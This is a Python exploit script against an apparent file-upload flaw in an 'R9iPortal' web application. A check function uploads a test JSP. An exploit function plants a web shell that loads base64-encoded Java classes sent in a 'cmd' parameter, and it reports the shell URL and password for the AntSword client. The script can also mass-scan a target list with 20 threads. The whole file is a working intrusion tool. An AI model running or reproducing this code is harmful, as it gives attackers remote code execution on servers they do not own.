import requests,argparse,sys,json,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0",
    "Content-Length": "32",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Connection": "close",
    }   
def exp(url):
    print("漏洞利用>>>>>>>>>>>getshell<<<<<<<<<<<")
    time.sleep(1)
    data = '''
<%!
class POSTFIX extends ClassLoader{
  POSTFIX(ClassLoader c){super(c);}
  public Class trigger(byte[] b){
    return super.defineClass(b, 0, b.length);
  }
}
public byte[] graphical(String str) throws Exception {
  Class base64;
  byte[] value = null;
  try {
    base64=Class.forName("sun.misc.BASE64Decoder");
    Object decoder = base64.newInstance();
    value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
  } catch (Exception e) {
    try {
      base64=Class.forName("java.util.Base64");
      Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
      value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
    } catch (Exception ee) {}
  }
  return value;
}
%>
<%
out.println("aaaa");
String cls = request.getParameter("cmd");
if (cls != null) {
  new POSTFIX(this.getClass().getClassLoader()).trigger(graphical(cls)).newInstance().equals(new Object[]{request,response});
}
%>
    '''
    payload = '/servlet/FileUpload?fileName=abcd.jsp&actionID=update'
    target = url+payload
    rsp2 = requests.post(url=target,headers=headers,data=data,verify=False)
    rsp3 = requests.get(url=url+'/R9iPortal/upload/abcd.jsp',verify=False)
    if "aaaa" in rsp3.text:
        shell_url = url+"/R9iPortal/upload/abcd.jsp"
        print(f"[+]{shell_url}\n[+]密码：cmd(蚁剑)")
    else:
        print("没有成功")
def poc(url):
    payload = '/servlet/FileUpload?fileName=test.jsp&actionID=update'
    target = url+payload
    data = '<% out.println("This page !");%>'
    try:
        rsp = requests.get(url=url,verify=False)
        if rsp.status_code == 200:
            rsp2 = requests.post(url=target,headers=headers,data=data,verify=False)
            rsp3 = requests.get(url=url+'/R9iPortal/upload/test.jsp',verify=False)
            if 'This page !' in rsp3.text:
                print(f"[+]{url}存在文件上传漏洞")
                with open('./result.txt','a',encoding="utf-8") as f:
                    f.write(url+'\n')
                return True
            else:
                print(f"[-]{url}不存在文件上传漏洞")
                return False
        else:
            print(f"[-]{url}不存在文件上传漏洞")
    except Exception as e:
        print("该站点有问题")
        return False
def main():
    par = argparse.ArgumentParser()
    par.add_argument('-u','--url',dest='url',type=str,help='http://www.qqqq.com')
    par.add_argument('-f','--file',dest='file',type=str,help='target.txt')
    args = par.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and  args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
if __name__ == '__main__':
    main()